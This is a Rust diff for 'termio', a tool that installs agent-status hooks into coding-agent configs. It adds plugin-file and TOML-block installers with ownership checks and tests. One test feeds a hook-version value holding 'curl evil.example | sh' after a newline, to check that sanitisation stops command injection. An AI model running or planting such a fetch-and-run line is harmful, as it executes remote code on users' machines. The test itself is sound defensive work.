@@ -15,11 +15,16 @@
 //!   next destructive writer cannot out-merge us;
 //! - write nothing when the bytes already match.
 //!
-//! Stage 2 of `docs/design/20260825-agent-integration-moves-to-termiod.md` moves
-//! the JSON-manifest dialect, the script-directory dialect, and the skill
-//! installer. The plugin dialects and the TOML block are Stage 3 and are
-//! reported as skipped rather than silently dropped — a silent no-op is exactly
-//! what "no hooks on the VPS" looked like.
+//! There is a fifth rule that only shows up on the *second* install, and it is
+//! the one the SSH arm got wrong: **an install must replace what the last one
+//! wrote.** Each dialect has its own way of recognising its own work — a JSON
+//! group by its command, a script and a plugin by their marker, the TOML block
+//! by its begin/end banner — and every one of them has to hold, or a reinstall
+//! quietly doubles the hooks instead of refreshing them.
+//!
+//! Stages 2 and 3 of `docs/design/20260825-agent-integration-moves-to-termiod.md`:
+//! all six dialects plus the skill. The generated plugin sources live in
+//! [`super::plugin`].
 
 use super::machine;
 use super::manifest::{AgentCatalog, AgentDefinition, HookDialect, HookEvent, HookSpec, HookType};
@@ -88,19 +93,23 @@ pub enum Reporter {
 }
 
 impl Reporter {
-    /// The binary a hook invokes, absolute. The SSH arm had to emit
-    /// `$HOME/.local/bin/termiod` — a shell *expression* that needed one
-    /// escaping for `sh` and another for a Bun template literal — because the
-    /// writer could not see the box. This one is the daemon's own path.
+    fn is_local(&self) -> bool {
+        matches!(self, Reporter::TermioCli { .. })
+    }
+
+    /// The binary a hook invokes, absolute.
+    ///
+    /// The SSH arm had to emit `$HOME/.local/bin/termiod` — a shell *expression*
+    /// needing one escaping for `sh`, another for a Bun template literal, and a
+    /// third for a JavaScript string — because the writer could not see the box.
+    /// Worse, it was a *guess*: that path is where the Mac assumes a deploy put
+    /// the daemon, and a box that keeps it elsewhere got hooks that exec'd
+    /// nothing and said nothing. The daemon knows where it lives.
     fn binary_path(&self) -> String {
         match self {
             Reporter::TermioCli { path } => path.clone(),
             Reporter::TermiodDaemon => machine::daemon_binary(),
         }
-    }
-
-    fn is_local(&self) -> bool {
-        matches!(self, Reporter::TermioCli { .. })
     }
 
     /// Which bundled skill this machine gets.
@@ -113,7 +122,8 @@ impl Reporter {
     }
 }
 
-/// What the client asked for.
+/// What the client asked for, plus the one thing about this box it needed
+/// resolving against.
 #[derive(Debug, Clone)]
 pub struct InstallRequest {
     /// Install (true) or remove every integration termio has ever installed
@@ -131,6 +141,40 @@ pub struct InstallRequest {
     /// the idempotent write re-install the hook on the first launch after an
     /// upgrade.
     pub hook_version: String,
+    /// The absolute binary every generated hook invokes, resolved once here
+    /// rather than per command — six dialects embed it, in four different
+    /// escaping contexts, and they must all name the same file.
+    binary: String,
+}
+
+impl InstallRequest {
+    pub fn new(
+        enabled: bool,
+        agents: Option<Vec<String>>,
+        hooks: bool,
+        skills: bool,
+        reporter: Reporter,
+        hook_version: String,
+    ) -> InstallRequest {
+        let binary = reporter.binary_path();
+        InstallRequest {
+            enabled,
+            agents,
+            hooks,
+            skills,
+            reporter,
+            hook_version,
+            binary,
+        }
+    }
+
+    pub(super) fn binary(&self) -> &str {
+        &self.binary
+    }
+
+    pub(super) fn is_local(&self) -> bool {
+        self.reporter.is_local()
+    }
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
@@ -300,21 +344,57 @@ fn install_hooks(
                 outcome.err(),
             )
         }
-        HookType::Plugin | HookType::Toml => InstallResult::new(
-            agent,
-            "hooks",
-            &spec
-                .file
-                .as_deref()
-                .or(spec.directory.as_deref())
-                .map(|path| machine::expand(path).display().to_string())
-                .unwrap_or_default(),
-            InstallStatus::Skipped,
-            Some(format!(
-                "{} hooks are still installed by the app",
-                spec.hook_type.as_str()
-            )),
-        ),
+        HookType::Plugin => {
+            let installer = match PluginFile::new(spec, request) {
+                Some(installer) => installer,
+                None => {
+                    return InstallResult::new(
+                        agent,
+                        "hooks",
+                        "",
+                        InstallStatus::Failed,
+                        Some("incomplete plugin hook manifest".into()),
+                    )
+                }
+            };
+            let path = machine::expand(&installer.path).display().to_string();
+            let outcome = installer.install();
+            InstallResult::new(
+                agent,
+                "hooks",
+                &path,
+                if outcome.is_ok() {
+                    InstallStatus::Installed
+                } else {
+                    InstallStatus::Failed
+                },
+                outcome.err(),
+            )
+        }
+        HookType::Toml => {
+            let Some(file) = spec.file.as_deref() else {
+                return InstallResult::new(
+                    agent,
+                    "hooks",
+                    "",
+                    InstallStatus::Failed,
+                    Some("incomplete TOML hook manifest".into()),
+                );
+            };
+            let installer = TomlHookBlock::new(file, spec, request);
+            let outcome = installer.install();
+            InstallResult::new(
+                agent,
+                "hooks",
+                &machine::expand(file).display().to_string(),
+                if outcome.is_ok() {
+                    InstallStatus::Installed
+                } else {
+                    InstallStatus::Failed
+                },
+                outcome.err(),
+            )
+        }
     }
 }
 
@@ -324,9 +404,38 @@ fn uninstall_hooks(spec: &HookSpec) {
         (HookType::Scripts, _, Some(directory)) => {
             ScriptHookDirectory::bare(directory).uninstall()
         }
-        // Stage 3 owns the plugin and TOML sweeps; until then the app's own
-        // uninstall path still reaches them.
+        (HookType::Plugin, _, Some(directory)) => PluginFile::bare(directory, spec.dialect)
+            .map(|installer| installer.uninstall())
+            .unwrap_or(()),
+        (HookType::Toml, Some(file), _) => TomlHookBlock::bare(file).uninstall(),
         _ => {}
+    }
+}
+
+/// The stdin JSON fields the `termio` CLI mines out of an agent's hook payload.
+///
+/// Only the JSON-manifest dialect supplies them: it is the one whose hosts
+/// verifiably always feed a hook a JSON blob on stdin, so the CLI's `cat`
+/// cannot block. The script directory, the TOML block and the plugin templates
+/// all take the bare command, and saying so once here is what keeps a manifest
+/// that declares `capturesTranscript` on a dialect that cannot honour it from
+/// quietly emitting a flag that hangs the hook.
+#[derive(Default)]
+pub struct StdinMining<'a> {
+    captures_transcript: bool,
+    conversation: Option<&'a str>,
+    tool: Option<&'a str>,
+    prompt_title: Option<&'a str>,
+}
+
+impl<'a> StdinMining<'a> {
+    fn of(spec: &'a HookSpec) -> StdinMining<'a> {
+        StdinMining {
+            captures_transcript: spec.captures_transcript,
+            conversation: spec.conversation.as_deref(),
+            tool: spec.tool.as_deref(),
+            prompt_title: spec.prompt_title.as_deref(),
+        }
     }
 }
 
@@ -335,31 +444,30 @@ fn uninstall_hooks(spec: &HookSpec) {
 /// working") is baked in at install time and nothing agent-specific runs later.
 pub fn report_command(
     state: &str,
-    spec: &HookSpec,
+    mining: &StdinMining<'_>,
     dialect: HookDialect,
     request: &InstallRequest,
 ) -> String {
-    let binary = shell_quote_path(&request.reporter.binary_path());
+    let binary = shell_quote_path(request.binary());
     let mut command = match &request.reporter {
         Reporter::TermiodDaemon => {
             format!("{binary} set-status \"$TERMIOD_SESSION_ID\" {state}")
         }
         Reporter::TermioCli { .. } => {
             let mut command = format!("{binary} agent report {state}");
-            // The agent's stdin blob is mined by the CLI (jq-free). Only enabled
-            // for agents verified to always supply stdin, so the `cat` cannot
-            // block. Each field name was validated at manifest load to be a bare
-            // identifier, so it embeds safely.
-            if spec.captures_transcript {
+            // The agent's stdin blob is mined by the CLI (jq-free). Each field
+            // name was validated at manifest load to be a bare identifier, so it
+            // embeds safely.
+            if mining.captures_transcript {
                 command.push_str(" --transcript");
             }
-            if let Some(field) = &spec.conversation {
+            if let Some(field) = mining.conversation {
                 command.push_str(&format!(" --conversation-from {field}"));
             }
-            if let Some(field) = &spec.tool {
+            if let Some(field) = mining.tool {
                 command.push_str(&format!(" --tool-from {field}"));
             }
-            if let Some(field) = &spec.prompt_title {
+            if let Some(field) = mining.prompt_title {
                 command.push_str(&format!(" --prompt-title-from {field}"));
             }
             command
@@ -384,7 +492,7 @@ pub fn report_command(
 
 /// Single-quotes a path for safe embedding in a hook shell command — the CLI
 /// copy can sit under `/Applications/termio dev.app`.
-fn shell_quote_path(value: &str) -> String {
+pub(super) fn shell_quote_path(value: &str) -> String {
     format!("'{}'", value.replace('\'', "'\\''"))
 }
 
@@ -506,7 +614,8 @@ impl<'a> JsonHookFile<'a> {
         strip_groups(&mut hooks, &is_theirs);
 
         for event in &spec.events {
-            let command = report_command(&event.state, spec, self.dialect, request);
+            let command =
+                report_command(&event.state, &StdinMining::of(spec), self.dialect, request);
             let group = match self.dialect {
                 HookDialect::CursorFlat => serde_json::json!({ "command": command }),
                 HookDialect::CopilotFlat => {
@@ -703,7 +812,7 @@ impl<'a> ScriptHookDirectory<'a> {
         let mut refused = Vec::new();
         for event in &spec.events {
             let path = format!("{}/{}", self.directory, event.name);
-            let contents = self.script(event, spec, request);
+            let contents = self.script(event, request);
             if let Some(existing) = read_text(&path) {
                 if existing != contents && !is_ours(&existing) {
                     refused.push(path);
@@ -752,12 +861,236 @@ impl<'a> ScriptHookDirectory<'a> {
         }
     }
 
-    fn script(&self, event: &HookEvent, spec: &HookSpec, request: &InstallRequest) -> String {
+    fn script(&self, event: &HookEvent, request: &InstallRequest) -> String {
         format!(
             "#!/bin/sh\n{}\n",
-            report_command(&event.state, spec, HookDialect::ClineScripts, request)
+            // A script directory takes the bare command: Cline hands its hooks
+            // no stdin blob to mine.
+            report_command(
+                &event.state,
+                &StdinMining::default(),
+                HookDialect::ClineScripts,
+                request,
+            )
         )
     }
+}
+
+// MARK: - The plugin dialects
+
+/// Agents whose integration is a single dropped-in file with no host config to
+/// merge: OpenCode loads a plugin from `~/.config/opencode/plugin`, Pi an
+/// extension from `~/.pi/agent/extensions`, Amp one from `~/.config/amp/plugins`.
+/// The source itself is [`super::plugin`]'s; this is the ownership and the write.
+///
+/// `termio.js` is a name a user could plausibly have chosen, so a file at that
+/// path is never claimed merely because it is in the way.
+struct PluginFile {
+    path: String,
+    contents: String,
+    /// The filename an earlier build used. Publishing the replacement and then
+    /// sweeping its predecessor is what keeps a rename from leaving the agent
+    /// loading two copies of the same plugin.
+    legacy_paths: Vec<String>,
+}
+
+impl PluginFile {
+    fn new(spec: &HookSpec, request: &InstallRequest) -> Option<PluginFile> {
+        let directory = spec.directory.as_deref()?;
+        let (filename, legacy) = super::plugin::filenames(spec.dialect)?;
+        // A device drops the conversation plumbing rather than tracking an id
+        // the daemon has no field for. One fact about `SetStatus`, applied here
+        // once, rather than three facts about three plugin APIs.
+        let conversation = if request.is_local() {
+            spec.conversation.as_deref()
+        } else {
+            None
+        };
+        let contents =
+            super::plugin::source(spec.dialect, &spec.events, conversation, request)?;
+        Some(PluginFile {
+            path: format!("{directory}/{filename}"),
+            contents,
+            legacy_paths: vec![format!("{directory}/{legacy}")],
+        })
+    }
+
+    /// The uninstall form: it needs the paths and the ownership rule, not the
+    /// source, so it does not need a request to generate one from.
+    fn bare(directory: &str, dialect: HookDialect) -> Option<PluginFile> {
+        let (filename, legacy) = super::plugin::filenames(dialect)?;
+        Some(PluginFile {
+            path: format!("{directory}/{filename}"),
+            contents: String::new(),
+            legacy_paths: vec![format!("{directory}/{legacy}")],
+        })
+    }
+
+    fn install(&self) -> Result<(), String> {
+        if machine::expand(&self.path).exists() {
+            match read_text(&self.path) {
+                Some(existing) if existing == self.contents || is_ours(&existing) => {}
+                _ => return Err(format!("refusing to overwrite non-termio plugin {}", self.path)),
+            }
+        }
+        // Whole-file, so there is no merge to commit against: termio owns every
+        // byte of it. Skipped when the bytes already match.
+        if read_bytes(&self.path).as_deref() != Some(self.contents.as_bytes()) {
+            write_atomically(&self.path, self.contents.as_bytes(), false)?;
+        }
+        // Publish the replacement before removing its predecessor.
+        for legacy in &self.legacy_paths {
+            self.remove_if_ours(legacy);
+        }
+        Ok(())
+    }
+
+    fn uninstall(&self) {
+        self.remove_if_ours(&self.path);
+        for legacy in &self.legacy_paths {
+            self.remove_if_ours(legacy);
+        }
+    }
+
+    fn remove_if_ours(&self, path: &str) {
+        match read_text(path) {
+            Some(existing) if is_ours(&existing) => remove(path),
+            _ => {}
+        }
+    }
+}
+
+// MARK: - The TOML block
+
+/// Agents that declare hooks as TOML `[[hooks]]` tables inside their main config
+/// file — currently Kimi Code.
+///
+/// There is no structured merge like the JSON agents get, and deliberately so:
+/// TOML arrays of tables may be non-contiguous, so termio appends one
+/// marker-delimited block at the end of the file and strips it back out by those
+/// markers on reinstall. Only the bytes between the markers are ever touched, so
+/// the user's providers, keys and their own `[[hooks]]` are never disturbed —
+/// the same conservative contract as the JSON dialect, without needing a TOML
+/// parser.
+///
+/// Kimi reads a hook's exit code (0 = allow) and the shared command ends in
+/// `|| true`, so no clean-stdout handling is required on its blockable events.
+struct TomlHookBlock<'a> {
+    path: String,
+    spec: Option<&'a HookSpec>,
+    request: Option<&'a InstallRequest>,
+}
+
+const TOML_BLOCK_BEGIN: &str = "# >>> termio agent-status hooks (managed — do not edit) >>>";
+const TOML_BLOCK_END: &str = "# <<< termio agent-status hooks <<<";
+
+impl<'a> TomlHookBlock<'a> {
+    fn new(path: &str, spec: &'a HookSpec, request: &'a InstallRequest) -> TomlHookBlock<'a> {
+        TomlHookBlock {
+            path: path.to_string(),
+            spec: Some(spec),
+            request: Some(request),
+        }
+    }
+
+    fn bare(path: &str) -> TomlHookBlock<'a> {
+        TomlHookBlock {
+            path: path.to_string(),
+            spec: None,
+            request: None,
+        }
+    }
+
+    fn install(&self) -> Result<(), String> {
+        let (Some(spec), Some(request)) = (self.spec, self.request) else {
+            return Err("nothing to install".into());
+        };
+        // The bytes the merge is computed from. This is a user-owned file, and
+        // one somebody may be editing right now.
+        let expected = read_bytes(&self.path);
+        let existing = expected
+            .as_deref()
+            .map(|bytes| String::from_utf8_lossy(bytes).into_owned())
+            .unwrap_or_default();
+        let base = trim_newlines(&strip_block(&existing));
+        let block = self.render(spec, request);
+        let updated = if base.is_empty() {
+            format!("{block}\n")
+        } else {
+            format!("{base}\n\n{block}\n")
+        };
+        if Some(updated.as_bytes()) == expected.as_deref() {
+            return Ok(());
+        }
+        write_if_unchanged(&self.path, updated.as_bytes(), expected.as_deref())
+    }
+
+    fn uninstall(&self) {
+        let Some(expected) = read_bytes(&self.path) else {
+            return;
+        };
+        let base = trim_newlines(&strip_block(&String::from_utf8_lossy(&expected)));
+        let updated = if base.is_empty() {
+            String::new()
+        } else {
+            format!("{base}\n")
+        };
+        if updated.as_bytes() == expected {
+            return;
+        }
+        if let Err(error) = write_if_unchanged(&self.path, updated.as_bytes(), Some(&expected)) {
+            log(&error);
+        }
+    }
+
+    /// A comment banner around one `[[hooks]]` table per event. The command is a
+    /// TOML multi-line literal string (`'''…'''`) so the shell one-liner's single
+    /// and double quotes need no escaping — it never contains three consecutive
+    /// single quotes.
+    fn render(&self, spec: &HookSpec, request: &InstallRequest) -> String {
+        let mut lines = vec![TOML_BLOCK_BEGIN.to_string()];
+        for event in &spec.events {
+            let command = report_command(
+                &event.state,
+                &StdinMining::default(),
+                HookDialect::KimiToml,
+                request,
+            );
+            lines.push("[[hooks]]".to_string());
+            lines.push(format!("event = \"{}\"", event.name));
+            if let Some(matcher) = &event.matcher {
+                lines.push(format!("matcher = \"{matcher}\""));
+            }
+            lines.push(format!("command = '''{command}'''"));
+            lines.push("timeout = 5".to_string());
+            lines.push(String::new());
+        }
+        if lines.last().map(String::is_empty) == Some(true) {
+            lines.pop();
+        }
+        lines.push(TOML_BLOCK_END.to_string());
+        lines.join("\n")
+    }
+}
+
+/// Remove a previously written termio block, markers inclusive. If both markers
+/// are not present the text comes back unchanged, so a hand-edited file is never
+/// mangled — and a reinstall therefore leaves exactly one block rather than
+/// appending a second.
+fn strip_block(text: &str) -> String {
+    let Some(begin) = text.find(TOML_BLOCK_BEGIN) else {
+        return text.to_string();
+    };
+    let search_from = begin + TOML_BLOCK_BEGIN.len();
+    let Some(end) = text[search_from..].find(TOML_BLOCK_END) else {
+        return text.to_string();
+    };
+    let end = search_from + end + TOML_BLOCK_END.len();
+    format!("{}{}", &text[..begin], &text[end..])
+}
+
+fn trim_newlines(text: &str) -> String {
+    text.trim_matches(|c| c == '\n' || c == '\r').to_string()
 }
 
 // MARK: - Skills
@@ -909,28 +1242,48 @@ fn log(message: &str) {
 }
 
 #[cfg(test)]
-mod tests {
+pub(super) mod tests {
     use super::*;
     use crate::agent::manifest::AgentManifest;
 
-    fn request(reporter: Reporter) -> InstallRequest {
-        InstallRequest {
-            enabled: true,
-            agents: None,
-            hooks: true,
-            skills: true,
+    /// A request whose binary is stated rather than resolved, so a test can
+    /// assert generated output byte for byte without depending on where the
+    /// test binary happens to sit.
+    fn request(reporter: Reporter, binary: &str) -> InstallRequest {
+        let mut request = InstallRequest::new(
+            true,
+            None,
+            true,
+            true,
             reporter,
-            hook_version: "9.9.9".into(),
-        }
+            "9.9.9".into(),
+        );
+        request.binary = binary.to_string();
+        request
     }
 
-    fn spec(json: &str) -> HookSpec {
+    /// A hook spec straight out of a manifest, so a test asserting generated
+    /// output is asserting what the real parse produces and not a hand-built
+    /// struct that happens to agree with it.
+    pub(crate) fn spec_of(json: &str) -> HookSpec {
         AgentManifest::parse(json.as_bytes())
             .expect("parses")
             .definition()
             .expect("resolves")
             .hooks
             .expect("has hooks")
+    }
+
+    fn spec(json: &str) -> HookSpec {
+        spec_of(json)
+    }
+
+    pub(crate) fn local_request(cli: &str) -> InstallRequest {
+        request(Reporter::TermioCli { path: cli.into() }, cli)
+    }
+
+    pub(crate) fn device_request(daemon: &str) -> InstallRequest {
+        request(Reporter::TermiodDaemon, daemon)
     }
 
     fn claude_spec() -> HookSpec {
@@ -944,11 +1297,9 @@ mod tests {
 
     #[test]
     fn the_local_command_invokes_the_public_report_contract() {
-        let request = request(Reporter::TermioCli {
-            path: "/Users/x/Application Support/termio/bin/termio".into(),
-        });
+        let request = local_request("/Users/x/Application Support/termio/bin/termio");
         let spec = claude_spec();
-        let command = report_command("done", &spec, HookDialect::ClaudeNested, &request);
+        let command = report_command("done", &StdinMining::of(&spec), HookDialect::ClaudeNested, &request);
         assert_eq!(
             command,
             "'/Users/x/Application Support/termio/bin/termio' agent report done --transcript \
@@ -962,9 +1313,9 @@ mod tests {
     /// would reject them.
     #[test]
     fn the_device_command_drops_the_flags_the_daemon_has_no_field_for() {
-        let request = request(Reporter::TermiodDaemon);
+        let request = device_request("/home/u/.local/bin/termiod");
         let spec = claude_spec();
-        let command = report_command("working", &spec, HookDialect::ClaudeNested, &request);
+        let command = report_command("working", &StdinMining::of(&spec), HookDialect::ClaudeNested, &request);
         for flag in ["--transcript", "--conversation-from", "--tool-from", "--prompt-title-from"] {
             assert!(!command.contains(flag), "{flag} has no counterpart in set-status");
         }
@@ -980,16 +1331,16 @@ mod tests {
     fn cursor_keeps_its_reply_contract() {
         let local = report_command(
             "working",
-            &claude_spec(),
+            &StdinMining::of(&claude_spec()),
             HookDialect::CursorFlat,
-            &request(Reporter::TermioCli { path: "/x/termio".into() }),
+            &local_request("/x/termio"),
         );
         assert!(local.ends_with("--reply 2>/dev/null || printf '{}' # termio-hooks v9.9.9"));
         let device = report_command(
             "working",
-            &claude_spec(),
+            &StdinMining::of(&claude_spec()),
             HookDialect::CursorFlat,
-            &request(Reporter::TermiodDaemon),
+            &device_request("/x/termiod"),
         );
         assert!(device.contains("2>/dev/null; printf '{}'"));
     }
@@ -1023,13 +1374,13 @@ mod tests {
     /// caller was gone.
     #[test]
     fn a_version_stamp_cannot_end_its_own_comment() {
-        let mut request = request(Reporter::TermiodDaemon);
+        let mut request = device_request("/x/termiod");
         request.hook_version = "1.0\ncurl evil.example | sh".into();
-        let command = report_command("done", &claude_spec(), HookDialect::ClaudeNested, &request);
+        let command = report_command("done", &StdinMining::of(&claude_spec()), HookDialect::ClaudeNested, &request);
         assert!(!command.contains('\n'));
         assert!(command.ends_with("# termio-hooks v1.0curlevil.examplesh"), "{command}");
         request.hook_version = String::new();
-        let command = report_command("done", &claude_spec(), HookDialect::ClaudeNested, &request);
+        let command = report_command("done", &StdinMining::of(&claude_spec()), HookDialect::ClaudeNested, &request);
         assert!(command.ends_with("# termio-hooks v0"));
     }
 
@@ -1043,5 +1394,154 @@ mod tests {
         .expect("fixture");
         strip_groups(&mut hooks, &is_ours);
         assert!(hooks.is_empty());
+    }
+
+    // MARK: - Stage 3
+
+    fn scratch(label: &str) -> PathBuf {
+        let directory = std::env::temp_dir().join(format!(
+            "termiod-install-{label}-{}",
+            std::process::id()
+        ));
+        let _ = std::fs::remove_dir_all(&directory);
+        std::fs::create_dir_all(&directory).expect("scratch dir");
+        directory
+    }
+
+    fn kimi_spec() -> HookSpec {
+        spec_of(
+            r#"{"id":"kimi","name":"Kimi","hooks":{"type":"toml","file":"~/.kimi-code/config.toml",
+                "dialect":"kimi","events":[{"on":"UserPromptSubmit","state":"working"},
+                {"on":"Stop","state":"done"}]}}"#,
+        )
+    }
+
+    /// The whole reason the TOML dialect appends a marker-delimited block rather
+    /// than merging: a second install has to *replace* the first. Get this wrong
+    /// and every launch adds another copy of every hook to a file the user also
+    /// keeps their provider keys in.
+    #[test]
+    fn a_second_toml_install_replaces_the_first() {
+        let directory = scratch("toml");
+        let path = directory.join("config.toml");
+        let user_content = "default_model = \"k2\"\n\n[[hooks]]\nevent = \"Stop\"\ncommand = \"mine\"\n";
+        std::fs::write(&path, user_content).expect("fixture");
+
+        let spec = kimi_spec();
+        let path = path.display().to_string();
+        let request = device_request("/home/u/.local/bin/termiod");
+        TomlHookBlock::new(&path, &spec, &request)
+            .install()
+            .expect("installs");
+        let once = std::fs::read_to_string(&path).expect("read");
+
+        // A different version, so the block's bytes change and the write is not
+        // skipped as a no-op — the case where an append would actually happen.
+        let mut newer = device_request("/home/u/.local/bin/termiod");
+        newer.hook_version = "99.0".into();
+        TomlHookBlock::new(&path, &spec, &newer)
+            .install()
+            .expect("installs again");
+        let twice = std::fs::read_to_string(&path).expect("read");
+
+        assert_eq!(twice.matches(TOML_BLOCK_BEGIN).count(), 1, "{twice}");
+        assert_eq!(twice.matches(TOML_BLOCK_END).count(), 1, "{twice}");
+        assert_eq!(twice.matches("[[hooks]]").count(), 3, "one user table, two ours");
+        assert!(twice.starts_with(user_content.trim_end_matches('\n')));
+        assert!(twice.contains("command = \"mine\""), "the user's own hook survives");
+        assert_ne!(once, twice, "the newer stamp did land");
+
+        TomlHookBlock::bare(&path).uninstall();
+        assert_eq!(
+            std::fs::read_to_string(&path).expect("read"),
+            user_content,
+            "uninstall leaves exactly what was there before"
+        );
+        let _ = std::fs::remove_dir_all(&directory);
+    }
+
+    /// A file with only one of the two markers is hand-edited, and cutting from
+    /// a marker to the end of the file would eat whatever follows.
+    #[test]
+    fn a_half_marked_toml_file_is_left_alone() {
+        let mangled = format!("a = 1\n{TOML_BLOCK_BEGIN}\n[[hooks]]\nb = 2\n");
+        assert_eq!(strip_block(&mangled), mangled);
+        let no_markers = "a = 1\n";
+        assert_eq!(strip_block(no_markers), no_markers);
+    }
+
+    fn opencode_spec() -> HookSpec {
+        spec_of(
+            r#"{"id":"opencode","name":"OpenCode","hooks":{"type":"plugin",
+                "dir":"~/.config/opencode/plugin","dialect":"opencode",
+                "conversation":"properties.sessionID",
+                "events":[{"on":"session.idle","state":"done"}]}}"#,
+        )
+    }
+
+    /// `termio.js` is a name a user could plausibly have chosen. Occupying our
+    /// desired path is not evidence that a file is ours.
+    #[test]
+    fn a_plugin_that_is_not_ours_is_never_claimed() {
+        let directory = scratch("plugin");
+        let mut spec = opencode_spec();
+        spec.directory = Some(directory.display().to_string());
+        let theirs = "export const mine = () => {};\n";
+        std::fs::write(directory.join("termio.js"), theirs).expect("fixture");
+
+        let request = device_request("/home/u/.local/bin/termiod");
+        let error = PluginFile::new(&spec, &request)
+            .expect("a plugin dialect")
+            .install()
+            .expect_err("must refuse");
+        assert!(error.contains("refusing to overwrite non-termio plugin"), "{error}");
+        assert_eq!(
+            std::fs::read_to_string(directory.join("termio.js")).expect("read"),
+            theirs,
+            "the user's file is untouched"
+        );
+
+        // An uninstall must not delete it either.
+        PluginFile::bare(&spec.directory.clone().unwrap_or_default(), spec.dialect)
+            .expect("a plugin dialect")
+            .uninstall();
+        assert!(directory.join("termio.js").exists());
+        let _ = std::fs::remove_dir_all(&directory);
+    }
+
+    /// Ours, on the other hand, is replaced — and a reinstall leaves one file,
+    /// not two. The legacy name an earlier build used is swept in the same pass.
+    #[test]
+    fn a_plugin_of_ours_is_replaced_and_its_predecessor_swept() {
+        let directory = scratch("plugin-ours");
+        let mut spec = opencode_spec();
+        spec.directory = Some(directory.display().to_string());
+        std::fs::write(
+            directory.join("termio-status.js"),
+            format!("// Socket marker: {SOCKET_MARKER}\n// an older build\n"),
+        )
+        .expect("fixture");
+
+        let request = device_request("/home/u/.local/bin/termiod");
+        for _ in 0..2 {
+            PluginFile::new(&spec, &request)
+                .expect("a plugin dialect")
+                .install()
+                .expect("installs");
+        }
+        let entries: Vec<String> = std::fs::read_dir(&directory)
+            .expect("listing")
+            .filter_map(|entry| entry.ok())
+            .filter_map(|entry| entry.file_name().to_str().map(str::to_string))
+            .collect();
+        assert_eq!(entries, vec!["termio.js".to_string()], "{entries:?}");
+        let source = std::fs::read_to_string(directory.join("termio.js")).expect("read");
+        assert_eq!(source.matches("const cli =").count(), 1);
+
+        PluginFile::bare(&spec.directory.clone().unwrap_or_default(), spec.dialect)
+            .expect("a plugin dialect")
+            .uninstall();
+        assert!(!directory.join("termio.js").exists());
+        let _ = std::fs::remove_dir_all(&directory);
     }
 }
